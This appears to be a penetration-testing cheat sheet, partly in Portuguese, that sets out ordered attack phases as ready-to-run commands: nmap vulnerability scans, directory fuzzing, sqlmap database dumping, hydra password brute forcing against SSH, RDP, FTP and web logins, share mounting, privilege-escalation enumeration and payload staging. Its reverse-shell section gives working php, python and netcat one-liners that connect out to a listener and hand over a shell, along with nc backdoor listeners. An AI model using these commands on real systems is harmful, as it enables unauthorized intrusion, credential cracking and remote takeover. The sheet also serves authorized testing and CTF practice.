# 1° Network Scan Nmap 

$ sudo nmap -sn 10.0.0.0/24 -oN report-ping-scan-nmap.txt

$ sudo nmap -Pn -p- -sV 10.0.0.123 -T4 -oN report-all-ports-nmap.txt

$ sudo nmap -Pn -A 10.0.0.123 -oN report-agressive-nmap.txt

$ sudo nmap -Pn -sV -sC -O 10.0.0.123 -oN report-basic-nmap.txt

$ sudo nmap -Pn --script vuln 10.0.0.123 -oN report-all-vulns.txt

$ sudo nmap -Pn -p 80 --script http-enum,http-robots.txt 10.0.0.123

$ sudo nmap -Pn -p 80 --script http-sql-injection 10.0.0.123

$ sudo nmap -Pn -p 80 --script http-passwd --script-args http-passwd.root=/test/ 10.0.0.123

$ sudo nmap -Pn -p 80 --script http-vuln-* 10.0.0.123

$ sudo nmap -Pn -p 21 --script ftp-anon 10.0.0.123

$ sudo nmap -Pn -p 21 --script ftp-proftpd-backdoor 10.0.0.123 [ProFTPD 1.3.3c]

$ sudo nmap -Pn -p 21 --script ftp-vsftpd-backdoor 10.0.0.123 [vsFTPd 2.3.4]

$ sudo nmap -Pn -p 111 --script nfs-ls,nfs-statfs,nfs-showmount 10.0.0.123

$ sudo nmap -Pn -p 445 --script smb-enum-shares,smb-enum-users 10.0.0.123

$ sudo nmap -Pn -p 445 --script smb-vuln-* 10.0.0.123

`$ wget https://svn.nmap.org/nmap/docs/nmap.usage.txt`

https://nmap.org/book/man.html

# 2° Web-Server Scan Dirb/Gobuster/ffuf/Nikto

$ dirb http://example.com -o dirb-report.txt

$ dirb http://example.com -X .txt -w /usr/share/dirb/wordlists/small.txt -o dir-report.txt

$ dirb http://example.com:8080 -w /usr/share/dirb/wordlists/big.txt -u user:password

$ gobuster dir -u http://example.com -w /usr/share/dirb/wordlists/small.txt -o dir-report.txt

$ gobuster dir -u http://example.com -x php,txt -w /usr/share/dirb/wordlists/common.txt -o dir-report.txt

$ gobuster dir -u http://example.com -w /usr/share/dirb/wordlists/big.txt -t 4 --delay 1s

$ gobuster dir -u http://example.com -x php,html,js,txt,zip -w /usr/share/dirb/wordlists/big.txt

$ gobuster dns -q -r 8.8.8.8 -d example.com -w /Wordlists/subdomains-top1million-5000.txt

$ gobuster vhost -u https://example.com -t 50 -w /wordlists/subdomains-top1million-5000.txt -o subdom.report.txt

$ ffuf -u http://example.com/FUZZ -w Wordlists/dir-list-2.3-medium.txt

$ ffuf -u http://example.com/FUZZ -w Wordlists/dir-list-2.3-medium.txt -o results.json -of json

$ ffuf -u http://example.com/FUZZ -w Wordlists/dir-list-2.3-medium.txt -fc 403

$ ffuf -u http://example.com/FUZZ -w Wordlists/dir-list-2.3-medium.txt --recursion-depth 2

$ ffuf -u http://example.com/FUZZ.txt -w Wordlists/dir-list-2.3-medium.txt -fc 403 -fs 292

$ ffuf -u http://example.com/FUZZ -w Wordlists/list-name.txt -X POST -d "username=FUZZ&password=pass"

$ ffuf -u http://FUZZ.example.com -w Wordlists/list-subdomains.txt -H "Host: FUZZ.example.com"

$ nikto -h http://example.com -o report.html

$ nikto -h http://example.com:8080/ -id user:password

# 3° Web-Site-DB Scan SQLMap/Burp Suite/ZAP

$ sqlmap -u http://example.com/login.php --forms --dump

$ sqlmap -u http://example.com/listproducts.php?cat=1 –-dbs

$ sqlmap -u  http://example.com/listproducts.php?cat=1 –-dbs -D products –-tables

Burp Suite > Proxy > Intercept > Open Browser > Intercept on

Burp Suite > Proxy > HTTP history > Send to Repeater > Send > Inspector (Change Attributes)

Burp Suite > Proxy > HTTP history > Send to Intruder > Sniper attack > Positions Add > Payload Type = Simple list > Load

ZAP Quick Start > Manual Explore > URL to explore: http://10.0.0.123 > Launch Browser (auto proxy localhost)

ZAP Quick Start > Automated Scan > URL to attack: http://10.0.0.123 > Set spider If Modern HtmlUnit > Attack

ZAP Sites > vulnerabilities > GET:/login,password,username > Attack > Fuzz (highlight password field)

ZAP Add > File: > /usr/share/wordlists/fasttrack.txt > OK > Start Fuzzer

# 4° Password Brute Force

$ hydra -l user-name -P /usr/share/wordlists/rockyou.txt -f Target_IP http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"

$ hydra -l user-name -P /usr/share/wordlists/fasttrack.txt Target_IP ftp

$ hydra -l user-name -P /usr/share/wordlists/fasttrack.txt -f Target_IP ssh

$ hydra -L name-list.txt -P /usr/share/wordlists/rockyou.txt Target_IP ssh

$ hydra -L name-list.txt -P /usr/share/wordlists/rockyou.txt Target_IP -s 2222 ssh

$ hydra -l user-name -P /usr/share/wordlists/fasttrack.txt -f Target_IP smb

$ hydra -l user-name -P /usr/share/wordlists/fasttrack.txt -f Target_IP rdp

$ hydra -L name-list.txt -P /usr/share/wordlists/rockyou.txt Target_IP -s 33389 rdp

$ hydra -l user-name -P /usr/share/wordlists/fasttrack.txt -f Target_IP http-get

$ hydra -L name-list.txt -P /usr/share/wordlists/rockyou.txt Target_IP -s 8080 http-get

$ hydra -l user-name -P /usr/share/wordlists/fasttrack.txt -f Target_IP pop3 -t 20

$ hydra -L name-list.txt -P /usr/share/wordlists/rockyou.txt Target_IP -s 13110 pop3 -t 20

https://github.com/danielmiessler/SecLists

https://weakpass.com

https://wordlists.assetnote.io

# 5° Scan SMB

$ enum4linux -a Target_IP

# 6° Gain Access

http://example.com/login [Exibir código fonte da página]

http://example.com/ftp

http://example/upload

http://example.com/hiden/dir

http://example.com/robots.txt

$ ftp Target_IP [user anonymous]

$ ssh user@Target_IP

$ ssh -i id_rsa user@Target_IP

$ ssh -oHostKeyAlgorithms=+ssh-rsa user@Target_IP

$ sudo mount -o rw Target_IP:/backup /tmp/dir-target

$ sudo mount -t cifs -o username=user_name //Target_IP/share_name /mnt/dir-target

$ smbclient //Target_IP/shared/dir

$ telnet Target_IP 1234

# 7° Extract-Info

$ exiftool picture.jpg

$ steghide --info picture.jpg

$ steghide --extract -sf picture.jpg

$ stegseek picture.png

$ binwalk picture.jpg

$ binwalk -e picture.jpg

$ binwalk -W picture.jpg

$ echo 'SGVsbG8gV29ybGQ=' | base64 -d

$ base64 -d encoded_file.txt > decoded_output.bin

$ gpg -d encoded_file.txt.gpg > file.txt

$ gunzip file.gz

$ tar -xzvf file.tar.gz

# 8° Reverse Shell

### Listening Basic Linux

$ nc -lnvp 4443

### Listening Basic Windows

C:\ nc -lnvp 4443

### Listening Backdoor Linux

$ nc -lnvp 4443 -e /bin/bash

### Listening Backdoor Windows

C:\ nc -lnvp 4443 -e cmd.exe

### Reverse Shell Linux

$ nc 10.0.0.123 4443 -e /bin/bash

### Reverse CMD Windows

C:\ nc 10.0.0.123 4443 -e cmd.exe

https://www.sans.org/posters/netcat-cheat-sheet

Implante o Payload de Shell Reverso [php, python, nc] - [command inject web, upload file]

`php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234))`

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`

https://github.com/pentestmonkey/php-reverse-shell

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

## Spawn a tty shell

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

# 9° Search Priv-Esc

$ cat /etc/proc/version

$ cat /etc/issue

$ cat /etc/passwd

$ cat /etc/crontab

$ cat /etc/exports

$ cat ~/.*history | less

$ id

$ ls -la /

$ ls -la /home

$ ls -la /home/user/.ssh

$ sudo -l

$ getcap -r / 2>/dev/null

$ find / -perm -o w -type d 2>/dev/null

$ find / -perm -u=s -type f 2>/dev/null

$ find / -name perl* python* gcc* 2>/dev/nul

$ find /home -name flag*.txt

$ find / -user "www-data" -name "*" 2>/dev/null

https://gtfobins.github.io

https://www.exploit-db.com

`$ wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -O lse.sh;chmod 700 lse.sh`

`$ wget "https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh" -O LinEnum.sh;chmod 700 LinEnum.sh`

# 10° Deploy Payloads

$ python2 -m SimpleHTTPServer 8000

$ python3 -m http-server 8000

$ scp payload.sh user@Target_IP:/home/user
